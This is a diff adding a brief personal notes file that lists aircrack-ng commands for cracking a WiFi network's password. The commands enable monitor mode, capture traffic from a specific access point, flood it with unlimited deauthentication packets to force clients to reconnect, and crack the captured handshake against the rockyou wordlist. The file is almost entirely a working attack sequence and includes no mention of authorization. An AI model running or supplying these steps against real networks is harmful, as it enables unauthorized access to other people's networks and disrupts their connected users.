@@ -1,0 +1,8 @@
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng -w OURFILE -c 1 --bssid 9A:0C:A5:5B:61:0B wlan0mon
+ourfile is a random file name -c 1 is channel name
+aireplay-ng -0 0 -a 9A:0C:A5:5B:61:0B wlan0mon
+open rockyou.txt
+aircrack-ng OURFILE-01.cap -w /usr/share/wordlists/rockyou.txt
